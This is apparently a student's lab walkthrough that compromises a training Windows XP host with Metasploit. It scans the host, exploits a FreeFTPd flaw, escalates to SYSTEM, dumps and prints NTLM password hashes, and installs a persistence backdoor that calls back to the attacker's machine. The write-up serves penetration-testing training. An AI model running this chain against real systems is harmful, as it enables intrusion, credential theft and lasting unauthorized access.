# Metasploit 

> Makayla Ferrell | July 28th, 2021

### Steps 

1. Connect to VPN 
```
sudo openvpn <filename> 
```
2. Find Network IP range 
```
ip a 
```
192.168.99.100/24

3. Find active hosts with fping 
```
fping -a -g 192.168.99.100/24 2>/dev/null 
```
The target is 192.168.99.12

4. Nmap scan target host 
```
nmap -sC -sV 192.168.99.12 
nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 host 
```
ports: 21/ftp 22/ssh 135/tcp 139/tcp 445/microsoftds 3389/mswbtserver 

5. Find Vulnerable service 
Ftp is vulnerable to anonymous login version FreeFTPd 1.o 

6. Launch Metasploit 
```
sudo apt update 
service postgresql start 
service metasploit start ? 
msfconsole 
```
7. Find exploit for machine 
```
msf> search freeftpd 
msf> use exploit/windows/ftp/freeftpd_pass
```
8. Set options and payload 
```
show options 
set RHOST 192.168.99.12 
set LHOST 192.168.99.100
```
9. Exploit 
```
exploit 
```

10. Get information 
meterpreter > sysinfo
Computer        : ELS-WINXP
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
 
meterpreter > getuid
Server username: ELS-WINXP\ftp
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

11. get hashes 
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
eLSAdmin:1003:aad3b435b51404eeaad3b435b51404ee:87289513bddc269f9bcb24d74864beb2:::
ftp:1004:4ff1ab31fc4b0ebdaad3b435b51404ee:9865c4bdcd9578a380297c5095e6c852:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::

12. Find congrats.txt file 
meterpreter > search -f congrats.txt
Found 1 result...
    c:\Documents and Settings\eLSAdmin\My Documents\Congrats.txt (64 bytes)
meterpreter > cat Congrats.txt
Congratulations! You have successfully exploited this machine!

13. obtain backdoor 
```
meterpreter> background  (session 1)
sessions -l 
msf> use exploit/windows/local/persistence 
show options 
msf6 exploit(windows/local/persistence) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence) > set LHOST 192.168.99.100
LHOST => 192.168.99.100
msf6 exploit(windows/local/persistence) > set DisablePayloadHandler False
DisablePayloadHandler => False
msf6 exploit(windows/local/persistence) > set STARTUP SYSTEM
STARTUP => SYSTEM
msf6 exploit(windows/local/persistence) > set LPORT 5555
LPORT => 5555
msf6 exploit(windows/local/persistence) > exploit

```